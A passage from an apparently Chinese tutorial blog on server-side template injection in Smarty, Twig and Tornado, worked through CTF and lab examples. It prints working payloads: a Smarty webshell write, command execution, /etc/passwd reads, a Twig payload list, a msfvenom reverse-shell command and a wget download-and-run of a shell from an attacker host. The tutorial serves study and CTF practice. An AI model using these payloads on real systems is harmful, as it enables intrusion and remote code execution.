        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// rename tmp file</span>
            <span class="token variable">$success</span> <span class="token operator">=</span> @<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$success</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// remove original file</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token comment">// rename tmp file</span>
                <span class="token variable">$success</span> <span class="token operator">=</span> @<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$success</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unable to write file <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_filepath</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-&gt;</span><span class="token property">_file_perms</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// set file permissions</span>
            <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">,</span> <span class="token variable">$smarty</span><span class="token operator">-&gt;</span><span class="token property">_file_perms</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">umask</span><span class="token punctuation">(</span><span class="token variable">$old_umask</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
<pre class="line-numbers language-none"><code class="language-none">public function clearConfig($varname = null)
{
    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>因此我们可以构造payload写个webshell:</p>
<pre class="line-numbers language-none"><code class="language-none">{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php eval($_GET['cmd']); ?&gt;",self::clearConfig())}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>CTF地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p>
<p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623185049916.png" alt="image-20230623185049916"></p>
<p>在页面的右上角发现了IP，但是题目中显示的API的URL由于环境的原因无法使用，猜测这个IP受X-Forwarded-For头控制。</p>
<p>将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623185133934.png" alt="image-20230623185133934"></p>
<p>直接构造 {system(‘cat /flag’)} 即可得到flag</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623185149818.png" alt="image-20230623185149818"></p>
<h3 id="1-Smarty-SSTI常规利用方式">1. Smarty-SSTI常规利用方式</h3>
<pre class="line-numbers language-none"><code class="language-none">**1. {$smarty.version}**

{$smarty.version}  #获取smarty的版本号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623185401662.png" alt="image-20230623185401662"></p>
<pre class="line-numbers language-none"><code class="language-none">2. {php}{/php}

{php}phpinfo();{/php}  #执行相应的php代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>Smarty支持使用 {php}{/php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623185441046.png" alt="image-20230623185441046"></p>
<p>因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
<pre class="line-numbers language-none"><code class="language-none">**3. {literal}**

&lt;script language="php"&gt;phpinfo();&lt;/script&gt;   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623185557407.png" alt="image-20230623185557407"></p>
<p><strong>4.</strong> <strong>getstreamvariable</strong></p>
<pre class="line-numbers language-none"><code class="language-none">{self::getStreamVariable("file:///etc/passwd")}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Smarty类的getStreamVariable方法的代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getStreamVariable</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        <span class="token variable">$_result</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$current_line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$_result</span> <span class="token operator">.=</span> <span class="token variable">$current_line</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$_result</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">smarty</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">smarty</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-&gt;</span><span class="token property">error_unassigned</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Undefined stream variable "'</span> <span class="token operator">.</span> <span class="token variable">$variable</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token constant">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623185656151.png" alt="image-20230623185656151"></p>
<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<pre class="line-numbers language-none"><code class="language-none">**5. {if}{/if}**

{if phpinfo()}{/if}

Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{/if}*

既然这样就将XFF头改为 {if phpinfo()}{/if} ：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623185829356.png" alt="image-20230623185829356"></p>
<p>同样还能用来执行一些系统命令：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623185839848.png" alt="image-20230623185839848"></p>
<h3 id="2-CTF漏洞成因">2. CTF漏洞成因</h3>
<p>本题中引发SSTI的代码简化后如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./smarty/libs/'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$smarty</span><span class="token operator">-&gt;</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"string:"</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// display函数把标签替换成对象的php变量；显示模板</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h3 id="3-PHP的模板注入">3. PHP的模板注入</h3>
<p>如果是在cookie处执行，最好抓包打payload，可能有url编码的问题</p>
<h2 id="六、PHP-Blade模板">六、PHP-Blade模板</h2>
<p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p>
<p>关于blade模板这里不再多说，请参考《<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sgm4231/p/10283661.html">laravel Blade 模板引擎</a>》</p>
<p>遇到在学吧…</p>
<h2 id="七、PHP-Twig引擎">七、PHP-Twig引擎</h2>
<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
<p>eg：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
　　<span class="token keyword">require_once</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'\twig\lib\Twig\Autoloader.php'</span><span class="token punctuation">;</span>
　　<span class="token class-name static-context">Twig_Autoloader</span><span class="token operator">::</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
　　<span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Twig_Loader_String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
　　<span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-&gt;</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello {{name}}"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将用户输入作为模版变量的值</span>
　　<span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。

其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。

使用 Twig 模版引擎渲染页面，其中模版含有 {{name}} 变量，其模版变量值来自于GET请求参数$_GET["name"] 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622220034048.png" alt="image-20230622220034048"></p>
<p>但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
　　<span class="token keyword">require_once</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../lib/Twig/Autoloader.php'</span><span class="token punctuation">;</span>
　　<span class="token class-name static-context">Twig_Autoloader</span><span class="token operator">::</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
　　<span class="token variable">$twig</span><span class="token operator">=</span><span class="token function">newTwig_Environment</span><span class="token punctuation">(</span><span class="token function">newTwig_Loader_String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
　　<span class="token variable">$output</span><span class="token operator">=</span><span class="token variable">$twig</span><span class="token operator">-&gt;</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将用户输入作为模版内容的一部分</span>
　　<span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622220108419.png" alt="image-20230622220108419"></p>
<pre class="line-numbers language-none"><code class="language-none">如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。

在Twig模板引擎里,，{{var}} 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。

例如这里用户输入name={{2*10}} ，则在服务端拼接的模版内容为:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623180615856.png" alt="image-20230623180615856"></p>
<p>尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:</p>
<pre class="line-numbers language-none"><code class="language-none">bmjoker{# comment #}{{2*8}}OK<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>实际服务端要进行编译的模板就被构造为:</p>
<pre class="line-numbers language-none"><code class="language-none">bmjoker{# comment #}{{2*8}}OK<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">由于 {# comment #} 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 {{2*8}} 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623180803003.png" alt="image-20230623180803003"></p>
<p>通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623181011667.png" alt="image-20230623181011667"></p>
<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p>
<p>每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p>
<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>
<p>凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。</p>
<p>接下来借助XVWA的代码来实践演示一下SSTI注入</p>
<p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;div&gt;{$what}&lt;/div&gt;
&lt;p&gt;Welcome, {{username}}&lt;/p&gt;
&lt;div&gt;{%$a%}&lt;/div&gt;
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623182009044.png" alt="image-20230623182009044"></p>
<pre class="line-numbers language-none"><code class="language-none">根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 {{ }} 的处理方式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在这里提供一个针对twig的攻击载荷：</p>
<pre class="line-numbers language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623182109299.png" alt="image-20230623182109299"></p>
<p>使用msf生成了一个php meterpreter有效载荷</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 &gt; /var/www/html/shell.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>msf进行监听：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623182457734.png" alt="image-20230623182457734"></p>
<p>模板注入远程下载shell，并重命名运行</p>
<pre class="line-numbers language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623182617009.png" alt="image-20230623182617009"></p>
<p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">{{'/etc/passwd'|file_excerpt(1,30)}}

{{app.request.files.get(1).__construct('/etc/passwd','')}}

{{app.request.files.get(1).openFile.fread(99)}}

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

{{_self.env.enableDebug()}}{{_self.env.isDebug()}}

{{["id"]|map("system")|join(",")

{{{"&lt;?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}

{{["id",0]|sort("system")|join(",")}}

{{["id"]|filter("system")|join(",")}}

{{[0,0]|reduce("system","id")|join(",")}}

{{['cat /etc/passwd']|filter('system')}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>具体payload分析详见：《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a>》</p>
<p>利用payload为： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">msf反弹shell</a></p>
<pre class="line-numbers language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}			//id是执行linux命令的地方，这个payload好像只能回显最前面的一个<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>补充：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a></p>
<h2 id="八、Python-tornado模板">八、Python-tornado模板</h2>
<pre class="line-numbers language-none"><code class="language-none">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的"FOO"，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>template
<span class="token keyword">import</span> tornado<span class="token punctuation">.</span>ioloop
<span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web
TEMPLATE <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
&lt;html&gt;
 &lt;head&gt;&lt;title&gt; Hello {{ name }} &lt;/title&gt;&lt;/head&gt;
 &lt;body&gt; Hello max &lt;/body&gt;
&lt;/html&gt;
'''</span>
<span class="token keyword">class</span> <span class="token class-name">MainHandler</span><span class="token punctuation">(</span>tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        name <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        template_data <span class="token operator">=</span> TEMPLATE<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"FOO"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
        t <span class="token operator">=</span> tornado<span class="token punctuation">.</span>template<span class="token punctuation">.</span>Template<span class="token punctuation">(</span>template_data<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>t<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>name<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>

application <span class="token operator">=</span> tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>Application<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">r"/"</span><span class="token punctuation">,</span> MainHandler<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> static_path<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> template_path<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    application<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span>
    tornado<span class="token punctuation">.</span>ioloop<span class="token punctuation">.</span>IOLoop<span class="token punctuation">.</span>instance<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623191121840.png" alt="image-20230623191121840"></p>
<p>这里拿一道BUUCTF的题来演示一下tornado render模板注入：</p>
<p><strong>[护网杯 2018]easy_tornado</strong></p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623191301525.png" alt="image-20230623191301525"></p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623191355233.png" alt="image-20230623191355233"></p>
<p>根据上面的信息，我们知道flag在/fllllllllllllag文件中</p>
<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用</p>
<p>最后就是这段代码md5(cookie_secret+md5(filename))，再来分析我们访问的链接：</p>
<pre class="line-numbers language-none"><code class="language-none">http://313ac7f3-c560-4d46-b1ff-daa279729980.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=27eda9bc17cbe1b856e6d541e10c16ea<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>推测md5加密过后的值就是url中filehash对应的值，想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret</p>
<pre class="line-numbers language-none"><code class="language-none">在tornado模板中，存在一些可以访问的快速对象，比如 {{escape(handler.settings["cookie"])}}，这个其实就是handler.settings对象，里面存储着一些环境变量。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>具体分析请参照《<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>》。</p>
<p>观察错误页面，发现页面返回的由msg的值决定</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623191732092.png" alt="image-20230623191732092"></p>
<p>修改msg的值注入，获得环境变量</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623191804739.png" alt="image-20230623191804739"></p>
<pre class="line-numbers language-none"><code class="language-none">cookie_secret: faaff564-f1dd-429d-90b3-130ab49962ea<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>得到cookie_secret的值，根据上面的md5进行算法重构，就可以得到filehash，这里给出py3的转换脚本</p>
